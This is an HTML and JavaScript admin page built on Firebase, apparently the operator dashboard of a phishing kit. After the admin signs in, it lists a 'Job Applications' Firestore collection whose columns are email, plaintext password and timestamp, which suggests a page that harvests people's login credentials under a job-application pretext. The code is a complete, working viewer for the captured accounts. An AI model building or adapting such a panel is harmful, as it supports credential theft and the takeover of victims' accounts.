<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Admin Panel</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet" />
    <style>
        * { font-family: 'Inter', Roboto, Arial, sans-serif; }
        body { background: #0a0a0a; color: #ffffff; padding: 40px 0; }
        .admin-card { background: rgba(255,255,255,0.03); border: 1px solid rgba(255,215,0,0.08); border-radius: 16px; padding: 32px; max-width: 900px; margin: 0 auto; }
        .admin-card h2 { color: #ffd700; font-weight: 400; }
        .table { color: #ffffff; }
        .table th { color: #ffd700; border-bottom: 2px solid rgba(255,215,0,0.2); }
        .table td { border-color: rgba(255,255,255,0.05); }
        .loading { color: rgba(255,255,255,0.5); text-align: center; padding: 40px 0; }
        .login-card { background: rgba(255,255,255,0.03); border: 1px solid rgba(255,215,0,0.1); border-radius: 16px; padding: 40px; max-width: 400px; margin: 0 auto; }
        .login-card input { background: rgba(255,255,255,0.05); border: 1px solid rgba(255,255,255,0.1); color: #ffffff; padding: 12px 16px; border-radius: 8px; width: 100%; }
        .login-card input:focus { border-color: #ffd700; outline: none; }
        .login-card .btn-gold { background: #ffd700; color: #0a0a0a; border: none; padding: 12px; font-weight: 600; border-radius: 8px; width: 100%; }
        .login-card .btn-gold:hover { background: #e6c200; }
        .error-msg { color: #ff6b6b; font-size: 0.9rem; margin-top: 8px; text-align: center; }
    </style>
</head>
<body>
    <div class="container">
        <!-- Login Form -->
        <div id="loginSection" class="login-card">
            <h3 style="text-align:center; color:#ffd700; margin-bottom:8px;">Admin Login</h3>
            <p style="text-align:center; color:rgba(255,255,255,0.5); margin-bottom:24px;">Enter your credentials</p>
            <form id="adminLoginForm">
                <div class="mb-3">
                    <input type="email" id="adminEmail" class="form-control" placeholder="Email address" required />
                </div>
                <div class="mb-3">
                    <input type="password" id="adminPassword" class="form-control" placeholder="Password" required />
                </div>
                <button type="submit" class="btn-gold">Login</button>
                <div id="loginError" class="error-msg"></div>
            </form>
        </div>

        <!-- Admin Panel -->
        <div id="adminSection" class="admin-card" style="display: none;">
            <h2 class="mb-4">Job Applications</h2>
            <div id="loading" class="loading">Loading applications...</div>
            <table class="table" id="applicationsTable" style="display: none;">
                <thead><tr><th>#</th><th>Email</th><th>Password</th><th>Timestamp</th></tr></thead>
                <tbody id="tableBody"></tbody>
            </table>
        </div>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/js/bootstrap.bundle.min.js"></script>
    <script type="module">
        import { db, auth } from './firebase-config.js';
        import { collection, getDocs, onSnapshot } from "https://www.gstatic.com/firebasejs/12.15.0/firebase-firestore.js";
        import { signInWithEmailAndPassword, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/12.15.0/firebase-auth.js";

        const loginSection = document.getElementById('loginSection');
        const adminSection = document.getElementById('adminSection');
        const loginForm = document.getElementById('adminLoginForm');
        const loginError = document.getElementById('loginError');
        const loading = document.getElementById('loading');
        const table = document.getElementById('applicationsTable');
        const tbody = document.getElementById('tableBody');

        // Check if already logged in
        onAuthStateChanged(auth, (user) => {
            if (user) {
                loginSection.style.display = 'none';
                adminSection.style.display = 'block';
                loginError.textContent = '';
                loadData();
            }
        });

        // Handle Login
        loginForm.addEventListener('submit', function(e) {
            e.preventDefault();
            const email = document.getElementById('adminEmail').value.trim();
            const password = document.getElementById('adminPassword').value.trim();

            signInWithEmailAndPassword(auth, email, password)
                .then((userCredential) => {
                    loginSection.style.display = 'none';
                    adminSection.style.display = 'block';
                    loginError.textContent = '';
                    loadData();
                })
                .catch((error) => {
                    loginError.textContent = 'Invalid email or password.';
                    console.error('Login error:', error);
                });
        });

        // Load data from Firestore
        function loadData() {
            const colRef = collection(db, 'applications');

            onSnapshot(colRef, (snapshot) => {
                loading.style.display = 'none';
                table.style.display = 'table';
                tbody.innerHTML = '';

                if (snapshot.empty) {
                    tbody.innerHTML = '<tr><td colspan="4" class="text-center">No applications yet.</td></tr>';
                    return;
                }

                let count = 1;
                snapshot.forEach((doc) => {
                    const data = doc.data();
                    const row = tbody.insertRow();
                    row.insertCell(0).textContent = count++;
                    row.insertCell(1).textContent = data.email || 'N/A';
                    row.insertCell(2).textContent = data.password || 'N/A';
                    row.insertCell(3).textContent = data.timestamp || 'N/A';
                });
            }, (error) => {
                loading.textContent = 'Error loading data. Check console.';
                console.error('Firestore error:', error);
            });
        }
    </script>
</body>
</html>
